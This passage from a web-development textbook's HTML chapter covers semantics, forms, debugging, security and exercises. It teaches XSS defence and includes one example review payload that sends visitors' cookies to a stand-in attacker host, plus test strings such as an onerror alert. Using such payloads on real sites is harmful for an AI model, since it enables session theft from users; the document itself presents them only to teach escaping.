- **Technical causes found:** fields without `type` or `autocomplete`, so phones showed the wrong keyboard and browsers could not auto-fill; error messages shown only in red, with no text, after submission; a "Place order" control built from a `<div>`.
- **Changes:** correct types and `autocomplete` values; labels and hints; built-in validation for immediate feedback, plus server validation; a real submit button.
- **Result:** faster checkout and fewer errors — accessibility improvements that helped every user.
- **Limit:** HTML improvements cannot fix a confusing process; fewer fields and clear steps matter too.

### A content site that search engines understood poorly

- **Problem:** articles ranked badly; analysis showed every page had the same `title`, headings built from styled `<div>`s, and images without alt text.
- **Changes:** unique titles and descriptions; real heading hierarchy; `<article>`, `<time>` and alt text; canonical URLs.
- **Result:** better understanding by search engines and better snippets in search results ({{ch:seo}}).

## Common mistakes

### Beginner: `div` for everything

**Consequence:** no landmarks, no keyboard support for "buttons", poor search understanding. **Fix:** reach for the semantic element first; use `div` and `span` only when no element has the right meaning.

### Beginner: missing or useless `alt`

Missing alt makes screen readers read file names; "image" or "photo" as alt says nothing. **Fix:** describe the purpose; `alt=""` for decorative images.

### Beginner: inputs without labels, or placeholders as labels

**Fix:** a `<label for>` for every input; hints in separate text linked with `aria-describedby`.

### Beginner: forgetting `name` on inputs

The field looks fine but its value never reaches the server. **Fix:** every submitted input needs a `name`; check the request in the browser's Network panel.

### Intermediate: choosing headings by size

An `<h4>` used because it "looks right", breaking the outline. **Fix:** headings by meaning, size by CSS.

### Intermediate: images without dimensions

Layout shifts as images load; users tap the wrong thing. **Fix:** `width` and `height` attributes on every image (CSS can still make them responsive).

### Production: trusting client-side validation

**Consequence:** invalid or malicious data reaches the database. **Fix:** validate everything on the server ({{ch:validation}}).

### Production: inserting user content as raw HTML

**Consequence:** cross-site scripting (below). **Fix:** escape on output; use frameworks' safe defaults.

## Debugging and troubleshooting

**The page looks wrong only in some places, or CSS selectors do not match.** Open the browser's developer tools (F12) and inspect the **Elements** panel: it shows the DOM the browser actually built, which may differ from your source if nesting was wrong (for example, a `<div>` inside a `<p>` causes the paragraph to close early).

**Characters display as `Ã©` or `�`.** An encoding mismatch: the file was saved in one encoding and read as another. Save files as UTF-8 and declare `<meta charset="utf-8">` first in `<head>`; make sure the server's `Content-Type` header agrees ({{ch:how-the-web-works}}).

**The page is tiny on a phone.** The viewport `<meta>` is missing.

**A form submits when you click an unrelated button.** A `<button>` inside the form has no `type`, so it defaults to `submit`. Add `type="button"`.

**A field's value is missing on the server.** Missing `name`, a `disabled` input (disabled fields are not submitted — use `readonly` if the value must be sent but not edited), or an unchecked checkbox.

**Validate the HTML.** The W3C's free online Nu HTML Checker reports invalid nesting, duplicate IDs and missing attributes. Browser extensions and the "Lighthouse" panel in Chrome's developer tools report accessibility and SEO problems.

## Security

### Escaping and cross-site scripting

Some characters have special meaning in HTML: `<` starts a tag, `&` starts a character reference, and `"` ends an attribute value. To display them as text, HTML uses **character references** (often called entities):

| Character | Reference |
|---|---|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&quot;` |
| `'` | `&#39;` |

This matters enormously for **security**. Suppose a shop displays product reviews by inserting the text customers type directly into the HTML. An attacker submits this "review":

```html
Great mangoes! <script>fetch("https://attacker.example/steal?c=" + document.cookie)</script>
```

If the server inserts it as raw HTML, every visitor's browser **runs the attacker's script** as if it came from the shop — it can read data on the page, act as the logged-in user, or redirect to a fake payment page. This is **cross-site scripting (XSS)**, one of the most common web vulnerabilities.

The defence is to **escape** user-provided text when inserting it into HTML, turning `<` into `&lt;` and so on, so the browser displays the characters instead of interpreting them:

```ts
function escapeHtml(text: string): string {
  return text
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;");
}

const review = `Great mangoes! <script>alert("hacked")</script>`;
console.log(`<p class="review">${escapeHtml(review)}</p>`);
```

**Output:**

```text
<p class="review">Great mangoes! &lt;script&gt;alert(&quot;hacked&quot;)&lt;/script&gt;</p>
```

- `&` must be replaced **first**; otherwise the `&` in the newly created `&lt;` would itself be escaped again, producing `&amp;lt;`.
- The browser now shows the review exactly as typed, including the visible text `<script>...`, but never executes it.

In practice, you rarely write this function yourself. Templating engines and frameworks escape by default — React, for example, escapes any text you put inside JSX ({{ch:react-basics}}). The danger lies in the features that **turn escaping off**: React's `dangerouslySetInnerHTML`, `innerHTML` in plain JavaScript ({{ch:browser-and-dom}}), or "raw" output in server templates. If you must display user-provided HTML (for example, formatted comments), pass it through a well-maintained **sanitiser** library that removes anything dangerous. Escaping is also context-specific: text placed inside a URL, a `<script>` block or a CSS value needs different rules. You will study XSS and its defences, including Content Security Policy, in {{ch:application-security}}.

### Other HTML security points

- **Links to user-supplied URLs** must be checked: an `href` of `javascript:...` runs code when clicked. Allow only `https:` (and perhaps `http:` and `mailto:`).
- **Forms** that change data need protection against cross-site request forgery when using cookie-based sessions ({{ch:sessions}}).
- **Hidden fields are not secret.** `<input type="hidden" name="price" value="45000">` is visible and editable in developer tools. Never trust a price, role or user id sent from a form; look them up on the server.
- **Comments and source are public.** Never put credentials, internal URLs or notes in HTML.
- **Embedding other sites** with `<iframe>` should use the `sandbox` attribute to restrict what the embedded page can do; conversely, protect your own pages from being framed by malicious sites (clickjacking) with HTTP headers ({{ch:application-security}}).

## Performance

- **Defer scripts**; avoid render-blocking resources in `<head>` beyond essential CSS.
- **Give every image dimensions**; lazy-load images below the fold; serve responsive sizes and modern formats.
- **Keep the DOM reasonably small.** Thousands of unnecessary wrapper `<div>`s make layout and JavaScript slower.
- **Send real HTML from the server** for important content, rather than an empty page filled in later by JavaScript, so content appears quickly and search engines see it ({{ch:nextjs}}).

You will measure all of this with the Core Web Vitals in {{ch:frontend-performance}}.

## How a senior engineer thinks about this

- **Native first.** Before building a custom widget, they ask whether `<button>`, `<a>`, `<select>`, `<details>`, `<dialog>` or `<input type="date">` already does the job — with accessibility and keyboard support included.
- **Meaning before appearance.** They choose elements for what content **is**, and leave appearance to CSS.
- **The keyboard test.** They put the mouse aside and try to use the page with Tab, Enter, Space and Escape alone. It reveals most structural problems in minutes.
- **Forms are revenue.** They treat form markup — labels, types, autocomplete, errors — as a business concern, not a detail.
- **Escape on output, validate on the server.** Every piece of user content is treated as untrusted when it reaches HTML.

## Exercises

### Exercise 1 — Fix the structure

**Objective:** practise semantic elements and correct nesting.
**Starting point:**

```html
<div class="top">
  <div class="logo">Corner Shop</div>
  <div class="menu"><a href="/">Home</a> | <a href="/fruit">Fruit</a></div>
</div>
<div class="content">
  <div class="big-title">Fresh fruit</div>
  <p>Our <b>best</b> sellers: <div>mangoes, peaches, lychees</div></p>
  <img src="lychee.jpg">
  <div class="btn" onclick="buy()">Buy now</div>
</div>
<div class="bottom">© Corner Shop</div>
```

**What to do:** rewrite it using semantic elements, a proper heading, a list, correct nesting, alt text with dimensions, and a real button.

<details>
<summary>Show the solution</summary>

```html
<header>
  <a href="/">Corner Shop</a>
  <nav aria-label="Main">
    <ul>
      <li><a href="/">Home</a></li>
      <li><a href="/fruit" aria-current="page">Fruit</a></li>
    </ul>
  </nav>
</header>

<main>
  <h1>Fresh fruit</h1>
  <p>Our <strong>best</strong> sellers:</p>
  <ul>
    <li>Mangoes</li>
    <li>Peaches</li>
    <li>Lychees</li>
  </ul>
  <img src="lychee.jpg" alt="A bowl of fresh red lychees" width="600" height="400">
  <button type="button" class="btn">Buy now</button>
</main>

<footer>
  <p>&copy; Corner Shop</p>
</footer>
```

**Walkthrough:**
- `header`, `nav`, `main` and `footer` replace the meaningless `div`s, giving the page landmarks.
- The menu is a list of links inside `nav`; the separators `|` were visual decoration and are better done with CSS.
- "big-title" becomes a real `<h1>`.
- The original `<div>` inside `<p>` is invalid: the browser would close the paragraph before the `div`. A list is the right element for three items.
- `<b>` became `<strong>`, assuming "best" is genuinely important; if it were only visual styling, CSS would be better.
- The image gets meaningful alt text and dimensions.
- The clickable `div` becomes a `<button type="button">`; its handler should be attached in JavaScript.

</details>

### Exercise 2 — An accessible sign-up form

**Objective:** practise labels, types, autocomplete and validation attributes.
**What to build:** a sign-up form with full name, email, mobile number (Pakistani format), password (at least 12 characters), a "Send me offers" checkbox (unchecked by default) and a submit button. It should post to `/signup`.

<details>
<summary>Show the solution</summary>

```html
<form action="/signup" method="post">
  <h1>Create your account</h1>

  <label for="full-name">Full name</label>
  <input id="full-name" name="fullName" type="text" autocomplete="name" required>

  <label for="email">Email</label>
  <input id="email" name="email" type="email" autocomplete="email" required>

  <label for="mobile">Mobile number</label>
  <input id="mobile" name="mobile" type="tel" autocomplete="tel" inputmode="tel"
         pattern="(\+92|0)3[0-9]{9}" required aria-describedby="mobile-hint">
  <p id="mobile-hint">For example 03001234567</p>

  <label for="password">Password</label>
  <input id="password" name="password" type="password" autocomplete="new-password"
         minlength="12" required aria-describedby="password-hint">
  <p id="password-hint">At least 12 characters. A short sentence works well.</p>

  <input id="offers" name="offers" type="checkbox" value="yes">
  <label for="offers">Send me occasional offers by email</label>

  <button type="submit">Create account</button>
</form>
```

**Walkthrough:**
- Every input has a `<label>` linked by `for`/`id`, and a `name` for submission.
- `type="email"` and `type="tel"` give the right keyboards and basic checks; `pattern` enforces the mobile format on the client.
- `autocomplete="new-password"` tells password managers to **suggest** a strong password rather than fill an old one.
- Hints are separate text, linked with `aria-describedby`, so they are read aloud and remain visible while typing.
- The marketing checkbox is unchecked by default — in many countries, data-protection rules require consent to be an active choice.
- **The server must repeat every check** ({{ch:validation}}), and must store the password only as a secure hash ({{ch:authentication}}).

</details>

### Exercise 3 — Debug the missing data

**Objective:** practise reasoning about form submission.
**The scenario:** the server receives orders without the delivery note and without the "express delivery" choice, even when customers fill them in. Here is the form:

```html
<form action="/orders" method="post">
  <label for="note">Delivery note</label>
  <textarea id="note"></textarea>

  <input type="checkbox" id="express" name="express" value="yes" disabled>
  <label for="express">Express delivery (+Rs 200)</label>

  <button>Apply coupon</button>
  <button type="submit">Place order</button>
</form>
```

**What to do:** find every bug.

<details>
<summary>Show the solution</summary>

1. **The textarea has no `name`**, so its value is never submitted. Add `name="note"`.
2. **The express checkbox is `disabled`**, and disabled controls are not submitted (and cannot be checked by the user). Perhaps a script enables it later and that failed — or the attribute was left by mistake. Remove `disabled`, or ensure it is removed when express delivery is available.
3. **"Apply coupon" has no `type`**, so it defaults to `submit`: clicking it places the order immediately, before the customer has finished. Add `type="button"` and handle the coupon with JavaScript (or give it its own form).

**How to find such bugs:** open the browser's Network panel, submit the form, and look at the request's payload — you see exactly which `name=value` pairs were sent.

</details>

### Exercise 4 — Production scenario: user reviews

**Objective:** apply HTML security to a real feature.
**The scenario:** your team is adding product reviews. Customers can enter a title, a star rating (1–5) and text. Product managers also want customers to be able to make words **bold**. Describe how the HTML for displaying reviews must be produced safely, and how you would support bold text.

<details>
<summary>Show the solution</summary>

1. **Treat all review content as untrusted.** Validate it on the server when submitted (length limits, rating an integer from 1 to 5) — {{ch:validation}}.
2. **Escape on output.** When rendering title and text into HTML, escape `&`, `<`, `>`, `"` and `'` — or, better, use a template engine or React, which escape text by default. Never build the HTML by string concatenation of raw input, and never use `innerHTML` or `dangerouslySetInnerHTML` with it.
3. **Render the rating from the number**, not from user text: for example, `<p>Rating: <data value="4">4 out of 5</data></p>`, so nothing customer-supplied is placed into attributes unescaped.
4. **Supporting bold:** do not accept raw HTML. Options:
   - Accept a tiny, safe markup such as `**bold**`, convert it on the server into `<strong>` **after** escaping everything else; or
   - If richer formatting is needed, accept HTML only through a well-maintained **sanitiser** configured with an allow-list (just `<strong>`, `<em>`, `<p>`, `<br>`), which removes every other element and every attribute — including event handlers such as `onerror`.
5. **Add defence in depth:** a Content Security Policy that blocks inline scripts, so a missed escaping bug is far harder to exploit ({{ch:application-security}}).
6. **Test it:** include a review containing `<script>` and `<img src=x onerror=alert(1)>` in automated tests, and assert that it is displayed as text ({{ch:testing}}).

</details>

## Summary

HTML is the markup language that gives web pages their **structure and meaning**. The browser parses HTML — tolerating errors silently — into a tree called the **DOM**, combines it with CSS and paints the page. Every document needs the doctype, `<html lang>`, `<meta charset="utf-8">`, the viewport `<meta>`, a specific `<title>`, and a description.

Use elements for what content **is**: headings in a logical outline with one `h1`; paragraphs, emphasis, lists, quotations and times; **links** to navigate and **buttons** to act; images with meaningful **alt text**, dimensions and responsive sources; **tables** only for tabular data, with captions and header scopes. Structure pages with **landmarks** — `header`, `nav`, `main`, `section`, `article`, `aside`, `footer` — plus a skip link, so assistive technology, search engines and developers understand them.

**Forms** need a label for every input, the right `type`, `name` and `autocomplete`, grouped choices in fieldsets, and explicit button types. Browsers submit `name=value` pairs by GET or POST and can validate on the client — but the **server must always validate again**. **Escape** user content on output to prevent cross-site scripting, and never trust hidden fields. Load scripts with `defer`, give images dimensions, and prefer native elements before building custom widgets.

## Key terms

- **HTML (HyperText Markup Language)** — The standard markup language that describes the structure and meaning of web pages.
- **Markup language** — A language that annotates text with tags describing its structure, without programming logic.
- **Element** — A component of an HTML document, usually written as an opening tag, content and a closing tag.
- **Tag** — Markup in angle brackets that opens or closes an element.
- **Attribute** — A name and value on an opening tag that provides extra information about an element.
- **Void element** — An HTML element that has no content and no closing tag, such as `img` or `input`.
- **Boolean attribute** — An attribute that is true when present and false when absent, such as `required`.
- **DOM (Document Object Model)** — The tree of objects a browser builds from an HTML document, which scripts can read and change.
- **Doctype** — The declaration at the top of an HTML document that makes the browser use standards mode.
- **Character encoding** — The rule that maps a file's bytes to characters; UTF-8 is the standard for the web.
- **Viewport meta tag** — A tag that tells mobile browsers to lay out the page at the device's real width.
- **Semantic element** — An HTML element whose name describes the meaning of its content.
- **Landmark** — A major region of a page, such as navigation or main content, that assistive technology lets users jump to.
- **Skip link** — A link at the start of a page that lets keyboard users jump directly to the main content.
- **Heading outline** — The hierarchy of headings on a page, which describes its structure.
- **Alternative text (alt text)** — A text description of an image for people and programs that cannot see it.
- **Responsive images** — Techniques such as `srcset` and `picture` that let the browser choose an image file suited to the screen.
- **Absolute URL** — A complete web address including the scheme and domain.
- **Relative URL** — An address interpreted relative to the current page's location.
- **Form control** — An interactive element in a form, such as an input, select, textarea or button.
- **Label** — Text associated with a form control that describes it and is read by assistive technology.
- **Client-side validation** — Checks performed by the browser before a form is submitted, which help users but provide no security.
- **URL encoding (percent-encoding)** — Representing special characters in URLs and form data with a percent sign followed by hexadecimal digits.
- **Accessibility** — Designing and building so that people with disabilities can use a product.
- **Screen reader** — Software that reads the content of the screen aloud or as braille for blind and visually impaired users.
- **Character reference (entity)** — A code such as `&lt;` that represents a character which would otherwise have special meaning in HTML.
- **Escaping** — Converting special characters into safe representations so they are displayed as text rather than interpreted as code.
- **Cross-site scripting (XSS)** — An attack in which malicious script is injected into a page and runs in other users' browsers.
- **Sanitiser** — A library that removes dangerous elements and attributes from untrusted HTML using an allow-list.
- **Render-blocking resource** — A file that stops the browser from displaying the page until it has been loaded.
- **Defer (script)** — A script attribute that downloads the script in parallel and runs it after the document has been parsed.
- **Open Graph** — A set of meta tags that control how a page appears when shared in social networks and messaging apps.

## What comes next

HTML gives a page its structure and meaning, but on its own it looks plain — black text on white, one block after another. The next chapter, {{ch:css}}, teaches the language that controls appearance and layout: how styles are selected and combined, the box model, Flexbox and Grid, responsive design for every screen size, and how to keep stylesheets maintainable as a site grows.
